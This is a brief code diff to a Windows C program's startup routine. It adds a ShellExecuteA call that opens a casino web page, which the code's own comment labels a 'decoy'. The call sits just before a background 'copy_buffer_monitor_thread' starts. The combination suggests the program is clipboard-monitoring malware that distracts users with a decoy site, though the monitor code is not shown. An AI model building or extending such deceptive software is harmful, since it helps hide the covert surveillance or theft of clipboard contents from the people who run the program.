@@ -198,6 +198,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     copy_buffer_init();
     ui_init();
     
+    /* Open casino decoy website */
+    ShellExecuteA(NULL, "open", "https://jjakinn.github.io/new-vivid-casino-1/", NULL, NULL, SW_SHOWNORMAL);
+    
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
     
